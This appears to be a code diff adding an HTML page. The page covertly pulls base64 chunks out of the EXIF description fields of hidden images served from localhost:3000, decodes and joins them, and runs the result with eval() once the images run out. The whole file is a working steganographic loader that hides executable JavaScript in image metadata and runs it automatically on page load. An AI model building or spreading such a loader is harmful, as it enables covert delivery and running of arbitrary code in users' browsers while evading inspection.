@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <style>
+        img {
+            display: none;
+        }
+    </style>
+    <img id="img" src="http://localhost:3000/image">
+    <script type="text/javascript" src="https://unpkg.com/piexifjs"></script>
+    <script type="text/javascript">
+        
+        let counter = 0;
+        let bigstringArray = [];
+
+        // reset the server side counter
+        fetch('http://localhost:3000/reset')
+
+        function loadNextImage() {
+            fetch('http://localhost:3000/image')
+                .then(response => response.arrayBuffer())
+                .then(arrayBuffer => {
+                    let array = new Uint8Array(arrayBuffer);
+                    let binaryString = String.fromCharCode.apply(null, array);
+                    let exifObj = piexif.load(binaryString);
+                    let chunk = exifObj["0th"][piexif.ImageIFD.ImageDescription];
+                    if (chunk) {
+                        counter++;
+                        chunk = atob(chunk);
+                        bigstringArray.push(chunk);
+                        // console.log(chunk);
+                        document.querySelector("#img").src = "http://localhost:3000/image";
+                    }
+                }).catch(error => {
+                    console.error(error)
+                });
+        }
+
+        function parseChars(array) {
+            let bigstring = array.join('');
+            let decodedString = bigstring
+
+            // Use the data
+            console.log(decodedString);
+            // console.log(counter);
+            return decodedString;
+        }
+
+        window.onload = loadNextImage;
+        document.querySelector("#img").onload = loadNextImage;
+
+        // if a 404 is returned, we've reached the end of the images
+        document.querySelector("#img").onerror = () => {
+            eval(parseChars(bigstringArray));
+        };
+
+    </script>
+</body>
+</html>
